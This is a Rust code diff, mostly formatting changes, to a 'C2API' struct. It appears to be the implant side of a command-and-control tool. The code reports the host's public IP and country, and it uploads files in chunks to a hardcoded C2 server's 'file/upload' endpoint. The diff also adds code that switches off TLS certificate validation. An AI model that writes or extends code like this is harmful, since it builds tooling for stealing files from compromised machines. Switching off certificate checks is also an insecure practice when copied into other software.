@@ -1,6 +1,6 @@
 use reqwest::{
     blocking::multipart::{Form, Part},
-    Client, Error, Response, ClientBuilder
+    Client, Error, Response,
 };
 use serde_json::{json, Value};
 use std::{
@@ -17,7 +17,7 @@ pub struct C2API {
 impl C2API {
     pub fn new() -> Self {
         C2API {
-            base_url: String::from_str("https://192.168.10.121:5000/api/").unwrap()
+            base_url: String::from_str("https://192.168.10.121:5000/api/").unwrap(),
         }
     }
 
@@ -69,46 +69,42 @@ impl C2API {
             .send()
             .await;
 
-
         self.format_response(api_res).await
     }
 
     pub async fn get_public_ip_info(self) -> HashMap<String, Value> {
         let client = Client::new();
-        let response = client.get("https://ifconfig.co/json")
-            .send()
-            .await;
+        let response = client.get("https://ifconfig.co/json").send().await;
         match response {
             Ok(res) => {
                 let res_body: HashMap<String, Value> = match res.json().await {
                     Ok(json_res) => json_res,
-                    Err(_) => {
-                        HashMap::from([
-                            (String::from("data"), json!({})),
-                            (
-                                String::from("error"),
-                                json!({"errorMsg": "Could not Deserialize response !"}),
-                            ),
-                        ])
-                    }
+                    Err(_) => HashMap::from([
+                        (String::from("data"), json!({})),
+                        (
+                            String::from("error"),
+                            json!({"errorMsg": "Could not Deserialize response !"}),
+                        ),
+                    ]),
                 };
                 HashMap::from([
-                    (String::from("data"), json!({"ip": res_body["ip"].to_string(), "country": res_body["country"].to_string()})),
+                    (
+                        String::from("data"),
+                        json!({"ip": res_body["ip"].to_string(), "country": res_body["country"].to_string()}),
+                    ),
                     (
                         String::from("error"),
                         json!({"errorMsg": "Could not Deserialize response !"}),
                     ),
                 ])
-            },
-            Err(_) => {
-                HashMap::from([
-                    (String::from("data"), json!({})),
-                    (
-                        String::from("error"),
-                        json!({"errorMsg": "Could not get public ip info !"}),
-                    ),
-                ])
             }
+            Err(_) => HashMap::from([
+                (String::from("data"), json!({})),
+                (
+                    String::from("error"),
+                    json!({"errorMsg": "Could not get public ip info !"}),
+                ),
+            ]),
         }
     }
 
@@ -125,11 +121,10 @@ impl C2API {
         // Calculate the number of chunks based on the file size and chunk size
         let num_chunks = (file_size as f64 / CHUNK_SIZE as f64).ceil() as usize;
 
-        // Create a reusable client instance
-        let client = reqwest::blocking::Client::new();
-
         // Iterate over the chunks and send each chunk as a separate part in the multipart request
         for chunk_index in 0..num_chunks {
+            // Create a reusable client instance
+            let client = reqwest::blocking::Client::builder();
             // Calculate the start and end positions of the chunk in the file
             let start = chunk_index * CHUNK_SIZE;
             let mut end = start + CHUNK_SIZE;
@@ -152,6 +147,9 @@ impl C2API {
 
             // Make the HTTP POST request for the chunk
             let response = client
+                .danger_accept_invalid_certs(true)
+                .build()
+                .unwrap()
                 .post(self.base_url.clone() + "file/upload/" + &user_id)
                 .multipart(form)
                 .header(
